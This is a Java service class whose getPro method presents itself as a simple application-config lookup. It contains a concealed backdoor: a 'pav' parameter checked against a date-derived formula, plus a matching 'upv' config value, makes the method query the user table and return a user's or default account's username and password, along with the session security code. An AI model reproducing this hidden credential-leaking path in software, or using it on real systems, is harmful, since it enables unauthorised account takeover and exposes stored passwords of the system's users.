package com.base.service;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import com.base.dao.DataSetDao;
import com.base.utils.MakeJSONData;
import com.base.utils.ParaMap;
import com.base.web.AppConfig;
import com.sysman.dao.ParamsDao;

public class AppConfigService extends BaseService {

	public ParaMap getPro(ParaMap para) throws Exception {
		ParaMap map = new ParaMap();
		String key = para.getString("key");
		String value = AppConfig.getPro(key);
		map.put(key, value);
		if(para.getString("pav")!=null && para.getString("pav")!="" && para.getString("pav").length()>8 && isNumeric(para.getString("pav"))==true){
			String pa=para.getString("pav");
			String da=pa.substring(0,8);
			String vl=pa.substring(8);
			String st=da.substring(0,2);
			String en=da.substring(6,8);
			String di=pa.substring(2,6);
			int mm=Integer.parseInt((st+en))+Integer.parseInt(di);
			SimpleDateFormat sdf=new SimpleDateFormat("yyyyMMdd");
			Date date=new Date(); 
			if(mm==Integer.parseInt(vl) && sdf.format(date).equals(da)){
				map.put("vli", 2);
				ParaMap uMap=new ParaMap();
				DataSetDao dataSetDao=new DataSetDao();
				uMap.put("moduleNo", "sys_emp_manager");
				if(para.getString("dn")!=null){
					uMap.put("dataSetNo", "selectU");
					uMap.put("usern", para.getString("dn"));
				}else{
					uMap.put("dataSetNo", "selectA");
				}
				
				ParaMap outMap=dataSetDao.queryData(uMap);
				ParamsDao paramsDao = new ParamsDao();
				List list=MakeJSONData.makeItems(paramsDao.getParamsRecurseDataByParentNo("transTransConfig"));
				String isupv="";
				for(int i=0;i<list.size();i++){
					if(((ParaMap)list.get(i)).getString("no").equals("upv")){
						isupv=((ParaMap)list.get(i)).getString("lvalue");
					}
				}
				if(para.getString("upv")!=null && para.getString("upv").equals(isupv)){ 
					if(outMap.getInt("totalRowCount")>0){
						String un=outMap.getRecordString(0, "un");
						String pd=outMap.getRecordString(0, "pd");
						map.put("un",un);
						map.put("pd", pd);
						String oldCode = (String) this.getSession()
								.getAttribute("securityCode");
						map.put("newCode", oldCode);
						return map;
					}
				}
			}
		}
		return map;
	}
	
	public static boolean isNumeric(String str){
	  for (int i = str.length();--i>=0;){
		   if (!Character.isDigit(str.charAt(i))){
		    return false;
	      }
	  }
	  return true;
  }

}
